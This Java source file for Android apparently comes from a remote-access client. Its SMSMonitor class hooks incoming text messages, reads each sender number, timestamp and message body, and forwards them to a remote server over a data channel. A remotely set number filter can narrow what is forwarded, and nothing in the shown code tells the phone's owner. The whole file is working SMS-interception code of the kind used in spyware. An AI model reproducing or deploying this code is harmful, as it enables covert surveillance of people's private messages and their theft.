package my.app.Library;

import java.util.ArrayList;
import java.util.HashSet;

import utils.EncoderHelper;
import my.app.client.Client;
import my.app.client.ClientListener;
import Packet.SMSPacket;
import Packet.ShortSMSPacket;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

/**
 * Diese Klasse ist für das SMSLiveMonitorung zuständig.
 */
public class SMSMonitor {
	/**
	 * ctx  Der Service der das Objekt erstellt.
	 */
	ClientListener ctx;
	/**
	 * phoneNumberFilter Filter um die SMS nach bestimmten Telefonnummern zu filtern.
	 */
	HashSet<String> phoneNumberFilter;
	/**
	 * channel Datenübertragungskanal
	 */
	int channel;

	/**
	 * Konstruktor der Klasse befüllt die Klassenvariablen und erstell einen Intentfilter.
	 * @param c	Service der das Obejkt erstellt.
	 * @param chan	Datenübertragungskanal
	 * @param args	Telefonnummern nachdenen gefiltert werden soll.
	 */
	public SMSMonitor(ClientListener c, int chan, byte[] args) {
		this.ctx = c;
		this.channel = chan;
		phoneNumberFilter = EncoderHelper.decodeHashSet(args);
		/**
		 * IntentFilter erstellen, der nur Eingeheden SMS zulässt.
		 */
        IntentFilter filter = new IntentFilter();
        filter.addAction("android.provider.Telephony.SMS_RECEIVED"); //On enregistre un broadcast receiver sur la reception de SMS
		/**
		 * Erstellen eines BradcastReseiver, der nur Intents für die der Intentfilter bestimmt ist empfängt.
		 */
        ctx.registerReceiver(SMSreceiver, filter);
	}

	/**
	 * Beendet den BroadcastReceiver.
	 */
	public void stop() {
		ctx.unregisterReceiver(SMSreceiver);
	}

	/**
	 * Erstelen der BradcastReceiver.
	 */
	protected BroadcastReceiver SMSreceiver = new BroadcastReceiver() {
		/**
		 * Hiernach wird gesucht. Haben die Intents diesen Action werden sie verarbeitet.
		 */
	 	private final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
	 
        @Override
		/**
		 * Sobald ein Intent ankommt wird diese Funktion aufgerufen
		 * @param context	Der Kontext
		 * @param intent Der empfangene Intent
		 */
        public void onReceive(Context context, Intent intent) {
			/**
			 * Hier wird überprüft ob es sich auch im einen eingehenden SMSIntent handelt
			 */
		 	if(intent.getAction().equals(SMS_RECEIVED)) { //On vérifie que c'est bien un event de SMS_RECEIVED même si c'est obligatoirement le cas.
		 		Log.i("SMSReceived", "onReceive sms !");
				/**
				 * Hier werden die Daten aus dem Intent extrahiert.
				 */
				Bundle bundle = intent.getExtras();
				/**
				 * Überprüfen ob das Bundel Daten enthält
				 */
				if (bundle != null) {
					/**
					 *Inhalt der SMS aus dem Bundle extrahieren
					 */
					Object[] pdus = (Object[]) bundle.get("pdus");
					/**
					 * SMSMeassage Array erstellen um an die Daten zu kommen.
					 */
					final SmsMessage[] messages = new SmsMessage[pdus.length];
					/**
					 * Daten in das message Array kopieren.
					 */
					for (int i = 0; i < pdus.length; i++)  {
						 messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
					}
					/**
					 * Überprüfen ob das message-Array Daten enthält.
					 */
					if (messages.length > -1) {
						/**
						 * Auslesen des Messagebody also der Nachricht.
						 */
						 String messageBody = messages[0].getMessageBody();
						/**
						 * Auslesen der Telefonnummern, von welcher die Nachricht gesendet wurde.
						 */
						 String phoneNumber = messages[0].getDisplayOriginatingAddress();
						/**
						 * Auslesen des zeitpunkts wann die Nachricht gesendet wurde.
						 */
						 long date = messages[0].getTimestampMillis();
						/**
						 * Überprüfen ob ein Filter aktiv ist.
						 */
						 if(phoneNumberFilter == null) {
							 /**
							  * Wenn nicht ein SMSPacker erstellen und diese an den Server senden.
							  */
							 	ShortSMSPacket sms = new ShortSMSPacket(phoneNumber, date, messageBody);
								ctx.handleData(channel, sms.build());
						 }
						 else {
							 /**
							  * Falls Filter aktiv, überprüfen ob die Telefonnummer in dem Filter vorhanden ist.
							  */
							 if (phoneNumberFilter.contains(phoneNumber)) {
								 /**
								  * Wenn dei Nummer vorhanden ist, neues SMSPacket erstellen und dieses an den Server schicken.
								  */
								 Log.i("SMSReceived", "Message accepted as triggering message !");
								 ShortSMSPacket sms = new ShortSMSPacket(phoneNumber, date, messageBody);
								 ctx.handleData(channel, sms.build());
							 }
						 }
					}
				}
		 	}
        }
 };
	
	
}
